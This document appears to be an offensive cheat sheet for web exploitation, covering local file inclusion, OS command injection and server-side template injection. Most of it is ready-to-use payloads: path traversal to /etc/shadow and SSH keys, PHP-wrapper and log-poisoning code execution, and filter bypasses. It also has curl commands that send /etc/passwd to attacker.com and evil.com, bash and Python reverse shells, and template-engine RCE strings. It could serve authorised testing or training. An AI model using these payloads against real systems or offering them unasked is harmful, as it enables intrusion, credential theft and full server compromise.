# LFI - Local File Inclusion

## What Is It
Read arbitrary files from the server filesystem.

## Features / Where to Find
- `?file=`, `?page=`, `?include=`, `?path=`, `?template=`
- `?lang=`, `?view=`, `?doc=`, `?content=`
- Log viewers, file browsers
- PDF/report generators
- Theme/template selectors
- Config file loaders

## Actions / Attack Techniques

### Basic Path Traversal
```
?file=../../../../etc/passwd
?file=../../../etc/shadow
?file=../../../../windows/win.ini
?page=../../../etc/hosts
```

### Filter Bypass
```
# Double encoding
?file=..%252f..%252f..%252fetc/passwd

# Null byte (old PHP)
?file=../../../etc/passwd%00.php
?file=../../../etc/passwd%00.jpg

# Path normalization
?file=....//....//....//etc/passwd
?file=..././..././..././etc/passwd

# Absolute path
?file=/etc/passwd
?file=/proc/self/environ

# Unicode
?file=..%c0%af..%c0%afetc/passwd
```

### PHP Wrappers (LFI → RCE)
```
# Read PHP source (base64)
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/read=convert.base64-encode/resource=config.php

# Execute code
?file=data://text/plain,<?php system('id');?>
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+

# Include remote file (if allow_url_include=On)
?file=http://evil.com/shell.txt

# PHP input
?file=php://input
POST data: <?php system('id');?>
```

### Log Poisoning → RCE
```bash
# 1. Poison Apache/Nginx log
curl "https://target.com/" -H "User-Agent: <?php system(\$_GET['cmd']);?>"

# 2. Include the log file
?file=../../../../var/log/apache2/access.log&cmd=id
?file=../../../../var/log/nginx/access.log&cmd=id

# Other log locations
/var/log/auth.log
/var/log/mail.log
/proc/self/environ
```

### Sensitive Files to Read
```
Linux:
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/proc/self/status
/home/user/.ssh/id_rsa
/var/www/html/config.php
/var/www/html/.env

Windows:
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\xampp\htdocs\config.php
```

## PoC
```
1. Find file parameter: ?page=home
2. Test: ?page=../../../etc/passwd
3. If works: read /etc/passwd, /proc/self/environ
4. Try PHP wrappers for source code
```

---

# Command Injection

## What Is It
Execute OS commands through vulnerable application input.

## Features / Where to Find
- Ping/traceroute tools
- DNS lookup features
- Network diagnostic tools
- Image processing (ImageMagick, ffmpeg)
- PDF generators
- Report generation
- "Test connection" features
- Filename in file operations
- Email sending functions

## Actions / Attack Techniques

### Basic Payloads
```bash
# Command separators
; id
| id
|| id
& id
&& id
`id`
$(id)
%0a id      # newline
%0d id      # carriage return
```

### Bypass Techniques
```bash
# Space bypass
${IFS}id
$IFS$9
{id}
id<>/dev/null

# Keyword bypass
w'h'o'am'i
who$@ami
/bin/c'a't /etc/passwd

# Blacklist bypass
/bin/cat /etc/passwd
/bin/cat$IFS/etc/passwd
```

### Blind Command Injection
```bash
# Time-based detection
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
& ping -c 5 127.0.0.1

# Out-of-band (DNS)
; nslookup YOUR.burpcollaborator.net
; curl http://YOUR.interactsh.com/$(id)
; wget http://YOUR.interactsh.com/`id`

# Out-of-band (HTTP with data)
; curl http://YOUR.interactsh.com/$(id|base64)
; curl "http://attacker.com/?data=$(cat /etc/passwd|base64)"
```

### Full RCE Chain
```bash
# 1. Detect injection
; sleep 5

# 2. Extract data
; curl http://evil.com/?data=$(id|base64)
; curl http://evil.com/?data=$(cat /etc/passwd|base64)

# 3. Reverse shell
; bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
; python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("evil.com",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

## PoC
```
Target: Ping tool at /ping?host=google.com
Test: /ping?host=google.com;sleep+5
Expected: 5 second delay = injection confirmed
Exploit: /ping?host=google.com;curl+http://evil.com/$(id|base64)
```

---

# SSTI - Server-Side Template Injection

## What Is It
Inject template directives → executed server-side → RCE.

## Features / Where to Find
- Email templates with user input
- Custom report generators
- Dynamic page content with user data
- Preview features
- Profile/bio fields rendered as templates
- Error messages containing user input
- Search queries reflected in templates

## Detection Payloads
```
{{7*7}}     → 49  (Jinja2, Twig)
${7*7}      → 49  (FreeMarker, Groovy)
<%= 7*7 %>  → 49  (ERB Ruby)
#{7*7}      → 49  (Ruby)
*{7*7}      → 49  (Spring)
{{7*'7'}}   → 7777777 (Jinja2) or 49 (Twig)
```

## Actions by Template Engine

### Jinja2 (Python/Flask)
```python
# Read files
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}

# Execute commands
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Simpler RCE
{% import os %}{{ os.popen('id').read() }}

# Filter bypass
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

### Twig (PHP)
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{[0]|reduce('system','id')}}
```

### FreeMarker (Java)
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
```

### ERB (Ruby)
```ruby
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read() %>
```

### Velocity (Java)
```java
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
```

## PoC
```
1. Find reflected user input: "Hello John" (name field)
2. Test: name={{7*7}} → response: "Hello 49" = SSTI!
3. Identify engine: {{7*'7'}} → 7777777=Jinja2, 49=Twig
4. Execute: name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
5. Result: "Hello uid=www-data(www-data)"
```

## Report Template
**Title:** SSTI in [feature] allows Remote Code Execution
**Severity:** Critical
**Impact:** Full server compromise, data exfiltration, reverse shell
